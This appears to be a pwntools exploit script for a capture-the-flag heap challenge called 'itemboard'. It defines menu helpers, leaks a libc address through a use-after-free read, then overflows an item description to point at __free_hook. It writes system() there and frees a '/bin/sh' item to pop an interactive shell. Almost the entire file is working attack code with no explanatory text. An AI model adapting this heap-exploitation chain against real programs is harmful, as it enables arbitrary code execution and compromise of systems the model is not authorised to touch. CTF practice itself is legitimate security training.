from pwn import *
context.log_level = 'debug'
sh = process('./itemboard')
#sh =remote('pwn2.jarvisoj.com','9887')
elf = ELF('./itemboard')
libc = ELF('./libc-2.19.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def add(name,size,des):
        sh.sendlineafter(':\n','1')
        sh.sendlineafter('name?\n',name)
        sh.sendlineafter('len?\n',str(size))
        sh.sendlineafter('Description?\n',des)

def list():
        sh.sendlineafter(':\n','2')


def show(idx):
        sh.sendlineafter(':\n','3')
        sh.sendlineafter('item?\n',str(idx))

def remove(idx):
        sh.sendlineafter(':\n','4')
        sh.sendlineafter('item?\n',str(idx))

# leak libc_base
add('0',0x80,'aaaa')
add('1',0x80,'bbbb')

remove(0)
show(0)
sh.recvuntil('Description:')
data = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
#gdb.attach(sh)
libc_base = data-0x3c4b78
free_hook_ptr =libc_base + 0x3c3ef8#libc.symbols['__free_hook']#0x3C67A8
system = libc_base + libc.symbols['system']


success("libc_base: " + hex(libc_base))
success("free_hook_ptr: " + hex(free_hook_ptr))
success("system: " + hex(system))

gdb.attach(sh)
pay = p64(system) 
pay +='a'*(1024 + 8-len(pay))
pay += p64(free_hook_ptr-8)

add('/bin/sh\x00',len(pay),pay)

#gdb.attach(sh)
remove(3)

sh.interactive()
